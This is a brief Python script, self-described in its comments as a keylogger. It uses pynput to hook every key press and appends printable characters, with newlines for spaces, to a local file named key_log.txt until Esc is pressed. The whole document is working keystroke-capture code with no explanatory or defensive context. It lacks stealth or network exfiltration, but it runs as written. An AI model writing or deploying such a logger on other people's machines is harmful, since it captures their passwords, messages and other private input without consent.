from pynput import keyboard

# File to save the logs
log_file = "key_log.txt"

# List to store keystrokes
keys = []

# Function to write keystrokes to the log file
def write_to_file(keys):
    with open(log_file, "a") as f:
        for key in keys:
            
            # Format the key and write it to the file
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

# Callback function for when a key is pressed
def on_press(key):
    keys.append(key)
    write_to_file(keys)
    keys.clear()

# Callback function for when a key is released
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()